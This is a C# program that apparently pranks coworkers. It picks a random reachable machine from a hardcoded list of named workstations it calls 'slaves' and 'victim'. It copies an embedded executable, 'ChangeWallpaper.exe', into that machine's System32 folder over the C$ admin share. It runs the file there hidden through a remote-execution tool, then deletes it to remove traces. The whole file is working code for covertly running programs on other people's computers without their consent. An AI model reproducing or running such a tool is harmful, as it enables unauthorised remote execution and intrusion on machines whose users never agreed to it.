using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Master
{
    class Program
    {
        private static string[] slaves = { "W8-JLAM", "W8-PLEE", "W8-JMiltztr", "W8-NNguyen" };

        static void Main(string[] args)
        {
            
            int num = (new Random()).Next(0, slaves.Length);
            string victim = getVictim(num);
            copyEXE(victim);
            runDatShit(victim);
            File.Delete(@"\\" + victim + @"\C$\Windows\System32\ChangeWallpaper.exe");
        }

        private static void runDatShit(string victim)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/c owexec.exe -nowait -k ChangeWallpaper.exe -c " + victim + @"""";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            System.Threading.Thread.Sleep(7000);
        }

        private static void copyEXE(string victim)
        {
            System.Reflection.Assembly myAssembly = System.Reflection.Assembly.GetExecutingAssembly();
            Stream myStream = myAssembly.GetManifestResourceStream("Master.ChangeWallpaper.exe");

            using (var fileStream = File.Create(@"\\" + victim + @"\C$\Windows\System32\ChangeWallpaper.exe"))
            {
                myStream.CopyTo(fileStream);
            }
        }

        private static string getVictim(int v)
        {
            string victim = slaves[v];
            while (!slaveOnline(victim))
            {
                victim = slaves[(new Random()).Next(0, slaves.Length)];
            }

            return victim;
        }

        private static bool slaveOnline(string victim)
        {
            System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
            try
            {
                System.Net.NetworkInformation.PingReply reply = ping.Send(victim);
                if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
                {
                    return true;
                }
            }
            catch (System.Net.NetworkInformation.PingException)
            {
                return false;
            }
            return false;
        }
    }
}
